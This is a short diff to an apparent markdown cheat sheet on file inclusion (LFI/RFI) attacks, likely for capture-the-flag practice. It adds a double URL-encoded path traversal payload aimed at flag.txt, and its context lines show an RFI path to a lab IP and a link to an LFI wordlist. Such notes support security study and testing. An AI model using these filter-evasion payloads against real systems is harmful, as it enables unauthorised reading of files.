@@ -31,6 +31,12 @@ file on the host using protocols like HTTP, FTP etc.
 //10.10.14.6/somefile --> RFI
 ```
 
+#### double URL encoding
+
+```py
+%25252e%25252e%25252fflag%25252etxt
+```
+
 ---
 
 [LFI wordlists](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt)
